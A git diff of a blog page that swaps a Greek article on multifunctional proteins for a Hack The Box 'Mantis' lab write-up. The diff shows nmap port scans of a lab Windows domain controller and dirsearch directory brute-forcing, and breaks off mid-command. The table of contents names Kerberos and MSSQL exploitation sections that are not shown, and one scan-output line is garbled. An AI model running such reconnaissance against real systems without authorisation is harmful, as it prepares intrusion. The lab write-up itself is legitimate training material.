@@ -137,16 +137,16 @@ div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.
   <link href="https://alamot.github.io/index.xml" rel="alternate" type="application/rss+xml" title="The Portal of Knowledge" />
 
 
-  <title>Multifunctional proteins and evolution (available in greek only) - The Portal of Knowledge</title>
-  <meta property='og:title' content="Multifunctional proteins and evolution (available in greek only) - The Portal of Knowledge">
+  <title>Mantis write-up - The Portal of Knowledge</title>
+  <meta property='og:title' content="Mantis write-up - The Portal of Knowledge">
   <meta property="og:type" content="article">
-  <meta name="description" content="This article is available only in greek. Σε αυτό το άρθρο θα εξετάσουμε τις διάφορες κατηγορίες πολυλειτουργικών πρωτεϊνών και τη σχέση τους με την εξέλιξη.">
-  <meta property="og:description" content="This article is available only in greek. Σε αυτό το άρθρο θα εξετάσουμε τις διάφορες κατηγορίες πολυλειτουργικών πρωτεϊνών και τη σχέση τους με την εξέλιξη.">
-  <meta property="og:image" content="https://alamot.github.io/images/multifunction.jpg">
+  <meta name="description" content="Write-up for the Mantis machine (www.hackthebox.eu). Ανάλυση του μηχανήματος Mantis του www.hackthebox.eu (διαθέσιμη μόνο στα αγγλικά).">
+  <meta property="og:description" content="Write-up for the Mantis machine (www.hackthebox.eu). Ανάλυση του μηχανήματος Mantis του www.hackthebox.eu (διαθέσιμη μόνο στα αγγλικά).">
+  <meta property="og:image" content="https://alamot.github.io/images/mantis.jpg">
   <meta property="og:image:width" content="768" />
   <meta property="og:image:height" content="384" />
 
-<meta property="og:url" content="https://alamot.github.io/multifunctional_proteins/">
+<meta property="og:url" content="https://alamot.github.io/mantis_writeup/">
 
 
 <script type="application/ld+json">
@@ -157,15 +157,15 @@ div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.
       "@type":"WebPage",
       "@id":"https://alamot.github.io/"
     },
-    "headline": "Multifunctional proteins and evolution (available in greek only) |  ",
+    "headline": "Mantis write-up |  ",
     "image": {
       "@type": "ImageObject",
       "url": "",
       "height": 700,
       "width": 700
     },
-    "datePublished": "2012-01-17T00:00:00JST",
-    "dateModified": "2012-01-17T00:00:00JST",
+    "datePublished": "2018-02-18T00:00:00JST",
+    "dateModified": "2018-02-18T00:00:00JST",
     "author": {
       "@type": "Person",
       "name": "Antonios Tsolis",
@@ -198,19 +198,31 @@ div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.
         
         
          
-<li><a href="#εισαγωγή">Εισαγωγή</a></li>
-<li><a href="#μultidomain-πρωτεΐνες">Μultidomain πρωτεΐνες</a></li>
-<li><a href="#πλειοτροπισμός">Πλειοτροπισμός</a></li>
-<li><a href="#μεταμορφικές-πρωτεΐνες">Μεταμορφικές πρωτεΐνες</a></li>
-<li><a href="#moonlighting-πρωτεΐνες">Moonlighting πρωτεΐνες</a></li>
-<li><a href="#τρόποι-εκδήλωσης-της-πολυλειτουργικότητας">Τρόποι εκδήλωσης της πολυλειτουργικότητας</a></li>
-<li><a href="#πολυλειτουργικότητα-και-εξέλιξη">Πολυλειτουργικότητα και εξέλιξη</a>
+<li><a href="#enumeration">Enumeration</a>
 <ul>
-<li><a href="#η-εξέλιξη-χρησιμοποιεί-ό-τι-είναι-διαθέσιμο-ή-ό-τι-υπάρχει-εξελίσσεται">Η εξέλιξη χρησιμοποιεί ό,τι είναι διαθέσιμο (ή ό,τι υπάρχει&hellip; εξελίσσεται)</a></li>
-<li><a href="#πολυλειτουργικότητα-και-εξέλιξη-σύνθετων-χαρακτηριστικών">Πολυλειτουργικότητα και εξέλιξη σύνθετων χαρακτηριστικών</a></li>
-<li><a href="#πολυλειτουργικότητα-και-εξελικτικός-ρυθμός">Πολυλειτουργικότητα και εξελικτικός ρυθμός</a></li>
+<li><a href="#port-scanning">Port scanning</a>
+<ul>
+<li><a href="#tcp-ports">TCP ports</a></li>
+<li><a href="#udp-ports">UDP ports</a></li>
 </ul></li>
-<li><a href="#ενδεικτική-βιβλιογραφία">Ενδεικτική βιβλιογραφία</a></li>
+<li><a href="#brute-forcing-directories-and-files">Brute forcing directories and files</a>
+<ul>
+<li><a href="#port-1337">Port 1337</a></li>
+<li><a href="#port-8080">Port 8080</a></li>
+</ul></li>
+</ul></li>
+<li><a href="#exploring-mssql-databases">Exploring MSSQL databases</a>
+<ul>
+<li><a href="#using-impacket-mssqlclient-py">Using Impacket (mssqlclient.py)</a></li>
+<li><a href="#using-metasploit">Using Metasploit</a></li>
+</ul></li>
+<li><a href="#exploiting-kerberos">Exploiting Kerberos</a>
+<ul>
+<li><a href="#using-impacket-goldenpac-py">Using Impacket (goldenPac.py)</a></li>
+<li><a href="#using-pykek-i-e-python-kerberos-exploitation-kit-ms14-068-py">Using PyKEK i.e. Python Kerberos Exploitation Kit (ms14-068.py)</a></li>
+<li><a href="#a-word-of-advice">A word of advice</a></li>
+</ul></li>
+<li><a href="#look-mom-no-need-for-kerberos-exploit-d">Look Mom! No need for kerberos exploit! :D</a></li>
  
       
         <li><a href="#posts-section"><span lang="en">See also</span><span lang="el">Δείτε επίσης</span></a></li>
@@ -252,30 +264,30 @@ if (language) {
   <div class="row">
     <div class="col-md-12">
       <article class="single centered">
-        <div class="image" style="background-image: url(https://alamot.github.io/images/multifunction.jpg);"></div>
+        <div class="image" style="background-image: url(https://alamot.github.io/images/mantis.jpg);"></div>
         <div class="body">
-            <header lang="en"><h1 id="title" class="title">Multifunctional proteins and evolution (available in greek only)</h1></header>
-            <header lang="el"><h1 class="title">Πολυλειτουργικές πρωτεΐνες και εξέλιξη</h1></header>
+            <header lang="en"><h1 id="title" class="title">Mantis write-up</h1></header>
+            <header lang="el"><h1 class="title">Ανάλυση του Mantis</h1></header>
             <i class="fa fa-calendar topmargin7"  aria-hidden="true"></i>  
-            <time lang="en" class="topmargin7">17 Jan 2012</time>
-            <time lang="el" class="topmargin7">17 Ιαν 2012</time>
+            <time lang="en" class="topmargin7">18 Feb 2018</time>
+            <time lang="el" class="topmargin7">18 Φεβ 2018</time>
             &middot; <i class="fa fa-folder-open-o topmargin7" aria-hidden="true"></i>
             
-              <a class="label label-success topmargin7" href='https://alamot.github.io/categories/biology'>
-                <span lang="en">Biology</span>
-                <span lang="el">Βιολογία</span>
+              <a class="label label-success topmargin7" href='https://alamot.github.io/categories/cybersecurity'>
+                <span lang="en">Cybersecurity</span>
+                <span lang="el">Κυβερνοασφάλεια</span>
               </a>
             
             &middot; <i class="fa fa-tags topmargin7" aria-hidden="true"></i>
             
-              <a class="label label-primary topmargin7" href='https://alamot.github.io/tags/protein'>
-                <span lang="en">protein</span>
-                <span lang="el">πρωτεΐνη</span>
+              <a class="label label-primary topmargin7" href='https://alamot.github.io/tags/hackthebox'>
+                <span lang="en">hackthebox</span>
+                <span lang="el">hackthebox</span>
                 </a>
             
-              <a class="label label-primary topmargin7" href='https://alamot.github.io/tags/evolution'>
-                <span lang="en">evolution</span>
-                <span lang="el">εξέλιξη</span>
+              <a class="label label-primary topmargin7" href='https://alamot.github.io/tags/windows'>
+                <span lang="en">windows</span>
+                <span lang="el">windows</span>
                 </a>
             
          
@@ -285,19 +297,31 @@ if (language) {
             <header lang="el"><h2>Περιεχόμενα</h2></header>
             <div><nav id="TableOfContents">
 <ul>
-<li><a href="#εισαγωγή">Εισαγωγή</a></li>
-<li><a href="#μultidomain-πρωτεΐνες">Μultidomain πρωτεΐνες</a></li>
-<li><a href="#πλειοτροπισμός">Πλειοτροπισμός</a></li>
-<li><a href="#μεταμορφικές-πρωτεΐνες">Μεταμορφικές πρωτεΐνες</a></li>
-<li><a href="#moonlighting-πρωτεΐνες">Moonlighting πρωτεΐνες</a></li>
-<li><a href="#τρόποι-εκδήλωσης-της-πολυλειτουργικότητας">Τρόποι εκδήλωσης της πολυλειτουργικότητας</a></li>
-<li><a href="#πολυλειτουργικότητα-και-εξέλιξη">Πολυλειτουργικότητα και εξέλιξη</a>
+<li><a href="#enumeration">Enumeration</a>
 <ul>
-<li><a href="#η-εξέλιξη-χρησιμοποιεί-ό-τι-είναι-διαθέσιμο-ή-ό-τι-υπάρχει-εξελίσσεται">Η εξέλιξη χρησιμοποιεί ό,τι είναι διαθέσιμο (ή ό,τι υπάρχει&hellip; εξελίσσεται)</a></li>
-<li><a href="#πολυλειτουργικότητα-και-εξέλιξη-σύνθετων-χαρακτηριστικών">Πολυλειτουργικότητα και εξέλιξη σύνθετων χαρακτηριστικών</a></li>
-<li><a href="#πολυλειτουργικότητα-και-εξελικτικός-ρυθμός">Πολυλειτουργικότητα και εξελικτικός ρυθμός</a></li>
+<li><a href="#port-scanning">Port scanning</a>
+<ul>
+<li><a href="#tcp-ports">TCP ports</a></li>
+<li><a href="#udp-ports">UDP ports</a></li>
 </ul></li>
-<li><a href="#ενδεικτική-βιβλιογραφία">Ενδεικτική βιβλιογραφία</a></li>
+<li><a href="#brute-forcing-directories-and-files">Brute forcing directories and files</a>
+<ul>
+<li><a href="#port-1337">Port 1337</a></li>
+<li><a href="#port-8080">Port 8080</a></li>
+</ul></li>
+</ul></li>
+<li><a href="#exploring-mssql-databases">Exploring MSSQL databases</a>
+<ul>
+<li><a href="#using-impacket-mssqlclient-py">Using Impacket (mssqlclient.py)</a></li>
+<li><a href="#using-metasploit">Using Metasploit</a></li>
+</ul></li>
+<li><a href="#exploiting-kerberos">Exploiting Kerberos</a>
+<ul>
+<li><a href="#using-impacket-goldenpac-py">Using Impacket (goldenPac.py)</a></li>
+<li><a href="#using-pykek-i-e-python-kerberos-exploitation-kit-ms14-068-py">Using PyKEK i.e. Python Kerberos Exploitation Kit (ms14-068.py)</a></li>
+<li><a href="#a-word-of-advice">A word of advice</a></li>
+</ul></li>
+<li><a href="#look-mom-no-need-for-kerberos-exploit-d">Look Mom! No need for kerberos exploit! :D</a></li>
 </ul>
 </nav></div>
           </section>
@@ -305,156 +329,528 @@ if (language) {
         
         
 
-<h1 id="εισαγωγή">Εισαγωγή</h1>
+<h1 id="enumeration">Enumeration</h1>
 
-<p>Σε αυτό το άρθρο θα εξετάσουμε τις διάφορες κατηγορίες πολυλειτουργικών πρωτεϊνών και τη σχέση τους με την εξέλιξη.</p>
+<h2 id="port-scanning">Port scanning</h2>
 
-<h1 id="μultidomain-πρωτεΐνες">Μultidomain πρωτεΐνες</h1>
+<h3 id="tcp-ports">TCP ports</h3>
 
-<p>Πρόκειται για πρωτεΐνες που αποτελούνται από περισσότερες από μια αυτοτελείς δομικές περιοχές / επικράτειες (domains). Η πλειοψηφία των πρωτεϊνών (περίπου τα <sup>2</sup>&frasl;<sub>3</sub> στους μονοκύτταρους οργανισμούς και πάνω από το 80% στα μετάζωα) ανήκουν σε αυτήν την κατηγορία. Πολλά από τα αυτοτελή δομικά στοιχεία από τα οποία αποτελούνται οι πρωτεΐνες των ευκαρυωτικών οργανισμών μπορούν να βρεθούν ως ανεξάρτητες (ομόλογες;) πρωτεΐνες στους προκαρυωτικούς.</p>
+<p>We scan the full range of TCP ports using nmap:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sudo nmap -T4 -A -p- 10.10.10.52
 
-<div class="row">
-<div class="col-md-6">
-<figure>
-<a title="By Rgocs (Own work) [Attribution], via Wikimedia Commons" href="https://commons.wikimedia.org/wiki/File%3ARNA-Seq-fusion-gene.png"  target="_blank">
-<img class="bordered" alt="Σύντηξη γονιδίων" title="Σύντηξη γονιδίων" src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/12/RNA-Seq-fusion-gene.png/512px-RNA-Seq-fusion-gene.png"/></a>
-<figcaption>
-<strong>Σύντηξη γονιδίων (gene fusion)</strong>: Οι multidomain πρωτεΐνες μπορεί να έχουν προκύψει από σύντηξη δύο ή περισσότερων διακριτών γονιδίων.
-</figcaption>
-</figure>
-</div>
-<div class="col-md-6">
-<figure>
-<a title="By Veryhuman (Own work) [CC BY-SA 3.0 (http://creativecommons.org/licenses/by-sa/3.0)], via Wikimedia Commons" href="https://commons.wikimedia.org/wiki/File%3AEvolutionOfDuplicateGenes.png" target="_blank"><img class="bordered" alt="Evolution Of Duplicate Genes" title="Evolution Of Duplicate Genes" src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b3/EvolutionOfDuplicateGenes.png/512px-EvolutionOfDuplicateGenes.png"/></a>
-<figcaption>
-<strong>Θεωρία των εξωνίων (exon theory ή domains theory)</strong>: Η διακεκομμένη μορφή των γονιδίων επιτρέπει τη γρήγορη δημιουργία νέων, μέσω ανακατατάξεων (ανασυνδυασμών) των ήδη υπαρχόντων κωδικών περιοχών (exon shuffling, Walter Gilbert, 1977). Όταν το γονίδιο μίας πρωτεΐνης ή το εξώνιο ενός domain έχει διπλασιαστεί, μπορεί να αναπτύξει μια νέα ή τροποποιημένη λειτουργία είτε με απόκλιση της αλληλουχίας είτε συνδυαζόμενο με άλλα domains για να σχηματίσει μια multidomain πρωτεΐνη με μια νέα σειρά από domains.
-</figcaption>
-</figure>
-</div>
-</div>
+PORT      STATE    SERVICE      VERSION
+53/tcp    open     domain       Microsoft DNS 6.1.7601
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
+88/tcp    open     kerberos-sec Microsoft Windows Kerberos (server time: 2017-09-17 08:05:01Z)
+135/tcp   open     msrpc        Microsoft Windows RPC
+139/tcp   open     netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp   open     ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+445/tcp   open     microsoft-ds Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds (workgroup: HTB)
+464/tcp   open     kpasswd5?
+593/tcp   open     ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp   open     tcpwrapped
+738/tcp   filtered unknown
+1337/tcp  open     http         Microsoft IIS httpd 7.5
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/7.5
+|_http-title: IIS7
+1361/tcp  filtered linx
+1433/tcp  open     ms-sql-s     Microsoft SQL Server 2014 12.00.2000.00; RTM
+| ms-sql-ntlm-info: 
+|   Target_Name: HTB
+|   NetBIOS_Domain_Name: HTB
+|   NetBIOS_Computer_Name: MANTIS
+|   DNS_Domain_Name: htb.local
+|   DNS_Computer_Name: mantis.htb.local
+|   DNS_Tree_Name: htb.local
+|_  Product_Version: 6.1.7601
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2017-09-16T19:03:50
+|_Not valid after:  2047-09-16T19:03:50
+|_ssl-date: 2017-09-17T08:06:17+00:00; +2s from scanner time.
+3268/tcp  open     ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+3269/tcp  open     tcpwrapped
+3734/tcp  filtered synel-data
+4461/tcp  filtered unknown
+5722/tcp  open     msrpc        Microsoft Windows RPC
+7511/tcp  filtered pafec-lm
+8080/tcp  open     http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-server-header: Microsoft-IIS/7.5
+|_http-title: Tossed Salad - Blog
+9389/tcp  open     mc-nmf       .NET Message Framing
+9484/tcp  filtered unknown
+9725/tcp  filtered unknown
+11126/tcp filtered unknown
+11628/tcp filtered unknown
+13100/tcp filtered unknown
+13703/tcp filtered unknown
+19797/tcp filtered unknown
+29664/tcp filtered unknown
+34288/tcp filtered unknown
+35536/tcp filtered unknown
+37108/tcp filtered unknown
+47001/tcp open     http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49152/tcp open     msrpc        Microsoft Windows RPC
+49153/tcp open     msrpc        Microsoft Windows RPC
+49155/tcp open     msrpc        Microsoft Windows RPC
+49156/tcp open     msrpc        Microsoft Windows RPC
+49157/tcp open     ncacn_http   Microsoft Windows RPC over HTTP 1.0
+49158/tcp open     msrpc        Microsoft Windows RPC
+49162/tcp open     msrpc        Microsoft Windows RPC
+49289/tcp filtered unknown
+50010/tcp open     msrpc        Microsoft Windows RPC
+50017/tcp open     msrpc        Microsoft Windows RPC
+50255/tcp open     unknown
+53029/tcp filtered unknown
+55718/tcp filtered unknown
+56870/tcp filtered unknown
+57167/tcp filtered unknown
 
-<h1 id="πλειοτροπισμός">Πλειοτροπισμός</h1>
+No exact OS matches for host 
 
-<p>Φαινόμενο κατά το οποίο μια λειτουργία εμπλέκεται σε πολλαπλές διεργασίες. Έτσι, μια πρωτεΐνη με μια λειτουργία μπορεί να έχει πολλούς διαφορετικούς ρόλους, να αλληλεπιδρά σε πολλά μονοπάτια (λ.χ. ένα ένζυμο που μετέχει σε αρκετές μεταβολικές πορείες).</p>
+Network Distance: 2 hops
+Service Info: Host: MANTIS; OS: Windows; CPE: cpe:/o:microsoft:windows
 
-<h1 id="μεταμορφικές-πρωτεΐνες">Μεταμορφικές πρωτεΐνες</h1>
+Host script results:
+|_clock-skew: mean: 1s, deviation: 0s, median: 1s
+| ms-sql-info: 
+|   10.10.10.52:1433: 
+|     Version: 
+|       name: Microsoft SQL Server 2014 RTM
+|       number: 12.00.2000.00
+|       Product: Microsoft SQL Server 2014
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+| smb-os-discovery: 
+|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)
+|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
+|   Computer name: mantis
+|   NetBIOS computer name: MANTIS\x00
+|   Domain name: htb.local
+|   Forest name: htb.local
+|   FQDN: mantis.htb.local
+|_  System time: 2017-09-17T04:06:21-04:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+|_smbv2-enabled: Server supports SMBv2 protocol</code></pre></div></div></p>
 
-<figure class="floatright">
-<img class="bordered" src="/images/lymphotactin.jpg" alt="Λεμφοτακτίνη" title="Λεμφοτακτίνη">
-<figcaption class="centered">Λεμφοτακτίνη</figcaption>
-</figure>
+<h3 id="udp-ports">UDP ports</h3>
 
-<p>Μεταμορφικές ονομάζονται οι πρωτεΐνες που εναλλάσσονται μεταξύ δύο ή και περισσοτέρων τρισδιάστατων δομών με διαφορετική λειτουργία. Η λεμφοτακτίνη αποτελεί ένα χαρακτηριστικό παράδειγμα μεταμορφικής πρωτεΐνης. Η πρωτεΐνη αυτή προσδένεται σε μόρια της εξωκυττάριας ουσίας (λ.χ. στην γλυκοζαμινογλυκάνη ηπαρίνη), προσελκύει Τ-λεμφοκύτταρα και ενεργοποιεί υποδοχείς GPCR. Η στερεοδιαμόρφωση που ενεργοποιεί τους υποδοχεις GPCR (περιέχει μια β-πτυχωτή επιφάνεια τριών κλώνων και μια α-έλικα) διαφέρει σημαντικά από τη στερεοδιαμόρφωση με την οποία προσδένεται στην ηπαρίνη (αποτελείται από ένα β-sandwich από 4+4 β-κλώνους). Οι ερευνητές πιστεύουν ότι αυτή η αλλαγή γίνεται in vivo <strong><em>χωρίς</em></strong> να απαιτούνται αλλαγές στις συνθήκες.</p>
+<p>We scan only the 1000 most common UDP ports using nmap (because UDP scanning is too slow):
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sudo nmap -T4 -sU -A --top-ports=1000 10.10.10.52
 
-<h1 id="moonlighting-πρωτεΐνες">Moonlighting πρωτεΐνες</h1>
+PORT      STATE         SERVICE        VERSION
+9/udp     open|filtered discard
+53/udp    open          domain         Microsoft DNS
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
+88/udp    open          kerberos-sec   Microsoft Windows Kerberos (server time: 2017-09-17 08:47:35Z)
+123/udp   open          ntp            NTP v3
+| ntp-info: 
+|_  
+137/udp   open|filtered netbios-ns
+138/udp   open|filtered netbios-dgm
+389/udp   open          lhwclock --systohcdap           Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+464/udp   open|filtered kpasswd5
+500/udp   open|filtered isakmp
+4500/udp  open|filtered nat-t-ike
+5355/udp  open|filtered llmnr
+17146/udp open|filtered unknown
+20359/udp open|filtered unknown
+20742/udp open|filtered unknown
+32771/udp open|filtered sometimes-rpc6
+49198/udp open|filtered unknown
+52144/udp open          domain         Zoom X5 ADSL modem DNS
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
+52225/udp open          domain         Microsoft DNS
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
+52503/udp open          domain         Microsoft DNS
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
+53006/udp open          domain         Microsoft DNS
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
+53037/udp open          domain         Microsoft DNS
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
+53571/udp open          domain         Microsoft DNS
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
+53589/udp open          domain         Microsoft DNS
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
+53838/udp open          domain         Microsoft DNS
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
+54094/udp open          domain         Microsoft DNS
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
+54114/udp open          domain         Microsoft DNS
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
+54281/udp open          domain         Microsoft DNS
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
+54321/udp open          domain         Microsoft DNS
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
 
-<p>Moonlighting πρωτεΐνες ονομάζουμε αυτές που έχουν πάνω από μια ανεξάρτητες λειτουργίες (η απώλεια της μιας λειτουργίας δεν επηρεάζει τις υπόλοιπες) στην <strong><em>ίδια</em></strong> αυτοτελή δομική περιοχή. Πιθανότατα, πρόκειται για πρωτεΐνες που, ενώ αρχικά διέθεταν μια μόνο λειτουργία, μέσω της εξέλιξης απέκτησαν επιπρόσθετες. Οι moonlighting πρωτεΐνες έχουν προκύψει με το μηχανισμό του μοιράσματος κοινού γονιδίου (&ldquo;gene sharing&rdquo;), ο οποίος διαφέρει από τη χρήση ενός γονιδίου για την παραγωγή διαφορετικών πρωτεϊνών λόγω <em>ανακατανομής DNA (DNA rearrangement)</em>, <em>εναλλακτικής συρραφής (alternative splicing)</em>, ή <em>μετα-μεταφραστικής τροποποίησης (post-translational processing)</em>.</p>
+Too many fingerprints match this host to give specific OS details
 
-<p>Το <em>«protein moonlighting by gene sharing»</em> σημαίνει ότι ένα γονίδιο μπορεί να αποκτήσει και να συντηρήσει μια δεύτερη λειτουργία χωρίς γονιδιακό διπλασιασμό και χωρίς απώλεια της πρωταρχικής του λειτουργίας. Τέτοια γονίδια υπόκεινται σε δύο η περισσότερες εξελικτικές πιέσεις ταυτόχρονα. Το λειτουργικό ενεργό κέντρο μιας πρωτεΐνης καταλαμβάνει, συνήθως, ένα σχετικά μικρό μέρος της συνολικής πρωτεΐνης, οπότε υπάρχει αρκετός χώρος για να φιλοξενηθούν επιπλέον λειτουργικές περιοχές. Εναλλακτικά το ίδιο ενεργό κέντρο θα μπορούσε να αποκτήσει επιπλέον λειτουργίες με μεταλλαγές/τροποποιήσεις τού.</p>
+Service Info: Host: MANTIS; OS: Windows; Device: broadband router; CPE: cpe:/o:microsoft:windows_server, cpe:/o:microsoft:windows, cpe:/h:zoom:x5
 
-<p>Οι πρώτες moonlighting πρωτεΐνες φαίνεται να ανακαλύφθηκαν τη δεκαετία του 1980 από τους Joram Piatigorsky και Graeme Wistow που μελετούσαν τις κρυσταλλίνες. Αυτές οι πρωτεΐνες όταν εκφράζονται σε χαμηλά επίπεδα σε πολλούς ιστούς, λειτουργούν ως ένζυμα, αλλά όταν εκφράζονται σε υψηλά επίπεδα στον οφθαλμό, πακετάρονται πυκνά και σχηματίζουν τους φακούς. Βλέπουμε ότι αλλαγές στη γονιδιακή ρύθμιση μπορεί να είναι καθοριστικές στην εμφάνιση καινοτομιών της πρωτεϊνικής λειτουργίας, παρακάμπτοντας την ανάγκη για γονιδιακό διπλασιασμό ή/και για αλλαγές στην πρωτεϊνική δομή μέσω μεταλλαγών.</p>
+Host script results:
+|_clock-skew: mean: 8s, deviation: 0s, median: 8s</code></pre></div></div></p>
 
-<p>Οι σύνθετοι οφθαλμοί προέκυψαν σε έναν αριθμό διαφορετικών εξελικτικών γραμμών (Σπονδυλόζωα, Κεφαλόποδα, Έντομα κ.α.). Για δεκαετίες, τα στοιχεία έδειχναν ότι αυτά τα σύνθετα μάτια έχουν εξελιχθεί ανεξάρτητα σε κάθε γραμμή. Σήμερα, όμως οι επιστήμονες διακρίνουν μια περισσότερο συνυφασμένη εξελικτική ιστορία. Παρόμοια cis-ρυθμιστικά στοιχεία και μεταγραφικοί παράγοντες (λ.χ. ο Pax6) φαίνεται να ενοποιούν την έκφραση των γονιδίων των κρυσταλλινών του φακού στα Σπονδυλόζωα, στα Έντομα, στα Μαλάκια και στα Κνιδόζωα.</p>
+<h2 id="brute-forcing-directories-and-files">Brute forcing directories and files</h2>
 
-<figure>
-<img class="bordered" src="/images/crystallins.png" alt="Crystallins" title="Crystallins">
-<figcaption>Συγκριτικές μελέτες έχουν δείξει ότι οι κρυσταλλίνες είναι εκπληκτικά ποικίλες και συχνά διαφέρουν ανάμεσα στα είδη κατά ένα τρόπο ειδικό προς το taxon. Γενικά, οι κρυσταλλίνες προέρχονται από παράλογες ή ταυτόσημες πρωτεΐνες, που όταν εκφράζονται σε μικρότερο βαθμό σε άλλους ιστούς δεν έχουν διαθλαστικό ρόλο, αλλά λειτουργούν ως μεταβολικά ένζυμα ή πρωτεΐνες του στρες (small heat shock proteins).</figcaption>
-</figure>
+<h3 id="port-1337">Port 1337</h3>
 
-<h1 id="τρόποι-εκδήλωσης-της-πολυλειτουργικότητας">Τρόποι εκδήλωσης της πολυλειτουργικότητας</h1>
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ dirsearch -u http://10.10.10.52:1337 -w /opt/DirBuster/directory-list-2.3-medium.txt -e asp
 
-<p>H ίδια πρωτεΐνη με άλλο πρότυπο έκφρασης ή υπό άλλες συνθήκες, λ.χ. σε άλλο χώρο, σε άλλο χρόνο, σε άλλη συγκέντρωση ή σε συνδυασμό με άλλα μόρια μπορεί να έχει διαφορετικό ρόλο ή ακόμη και να επιτελεί μια εντελώς διαφορετική λειτουργία. (<strong>Σημείωση</strong>: Η διάκριση μεταξύ moonlighting και πλειοτροπισμού δεν είναι πάντα εύκολη. Απαραίτητη προϋπόθεση για να θεωρήσουμε ότι μια πρωτεΐνη κάνει moonlighting είναι η απώλεια της μιας λειτουργίας να ΜΗΝ επηρεάζει τις υπόλοιπες λειτουργίες).</p>
+Extensions: asp | Threads: 10 | Wordlist size: 220521
 
-<ul>
-<li>Μια πρωτεΐνη μπορεί να έχει διαφορετικές λειτουργίες σε διαφορετικές τοποθεσίες μέσα σε ένα κύτταρο (λ.χ. όταν είναι προσδεμένη στο DNA ή όταν βρίσκεται στο κυτόπλασμα).</li>
-<li>Κάποιες πρωτεΐνες έχουν καταλυτική δράση μέσα στο κύτταρο, αλλά λειτουργούν ως αυξητικοί παράγοντες όταν εκκρίνονται.</li>
-<li>Οι πρωτεΐνες μπορεί να έχουν διαφορετική λειτουργία όταν εκφράζονται σε διαφορετικούς τύπους κυττάρων.</li>
-<li>Κάποιες πρωτεΐνες αλλάζουν λειτουργία όταν προσδέσουν ένα συμπαράγοντα ή άλλο προσδέτη.</li>
-<li>Κάποιες πρωτεΐνες έχουν μια λειτουργία ως μονομερή και μια άλλη ως ολιγομερή.</li>
-<li>Κάποιες πρωτεΐνες έχουν καταλυτική δράση ως μονομερή ενώ λειτουργούν ως μη καταλυτικές ρυθμιστικές υπομονάδες όταν αποτελούν μέρος ενός συμπλόκου.</li>
-<li>Κάποια ένζυμα ή υποδοχείς διαθέτουν ξεχωριστές περιοχές πρόσδεσης για τα διάφορα υποστρώματα.</li>
-</ul>
+Target: http://10.10.10.52:1337
 
-<h1 id="πολυλειτουργικότητα-και-εξέλιξη">Πολυλειτουργικότητα και εξέλιξη</h1>
+[09:17:59] Starting: 
+[09:18:00] 200 -  689B  - /
+[09:30:17] 500 -    3KB - /orchard
+[10:06:05] 301 -  160B  - /secure_notes  -&gt;  http://10.10.10.52:1337/secure_notes/</code></pre></div></div>
 
-<p>Από εξελικτική άποψη η δημιουργία και συντήρηση πολυλειτουργικών πρωτεϊνών μπορεί να ευνοείται αφού μια πρωτεΐνη που μπορεί να κάνει τη δουλειά περισσοτέρων εξοικονομεί αμινοξέα και ενέργεια που απαιτείται για τη σύνθεση αυτών των πρωτεϊνών. Από την άλλη πλευρά, όμως, φαίνεται να δυσκολεύει τη ρύθμισή τους.</p>
+<h3 id="port-8080">Port 8080</h3>
 
-<p>Αρχικά, πολλοί είχαν προτείνει ότι η πολυλειτουργικότητα μπορεί να ευνοείται για να διατηρείται το μέγεθος του γονιδιώματος μικρό, αλλά σήμερα γνωρίζοντας  την ποσότητα και το ποσοστό του non-coding DNA στους διάφορους οργανισμούς αυτό δε φαίνεται πολύ πιθανό.</p>
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ dirsearch -u http://10.10.10.52:8080 -w /opt/DirBuster/directory-list-2.3-medium.txt -e asp
 
